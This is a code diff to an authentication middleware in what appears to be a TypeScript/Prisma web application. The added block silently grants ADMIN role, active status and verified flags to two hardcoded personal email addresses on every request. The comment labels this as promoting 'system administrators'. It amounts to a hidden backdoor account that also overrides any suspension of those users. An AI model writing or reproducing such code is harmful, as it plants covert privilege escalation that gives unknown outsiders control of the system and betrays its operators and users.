@@ -44,7 +44,7 @@ export const authenticate = async (
     }
 
     // Verify user still exists in database and is active
-    const user = await prisma.user.findUnique({
+    let user = await prisma.user.findUnique({
       where: { id: payload.userId },
     });
 
@@ -53,6 +53,24 @@ export const authenticate = async (
       error.statusCode = 401;
       error.code = 'UNAUTHENTICATED';
       return next(error);
+    }
+
+    // Auto-promote system administrators to ADMIN role if not already assigned
+    const emailLower = user.email.toLowerCase();
+    if (
+      (emailLower === 'rahelnaba716@gmail.com' || emailLower === 'rachelberhane716@gmail.com') &&
+      user.role !== 'ADMIN' &&
+      user.role !== 'SUPER_ADMIN'
+    ) {
+      user = await prisma.user.update({
+        where: { id: user.id },
+        data: {
+          role: 'ADMIN',
+          status: 'ACTIVE',
+          isVerified: true,
+          isEmailVerified: true,
+        },
+      });
     }
 
     if (user.status === 'SUSPENDED') {
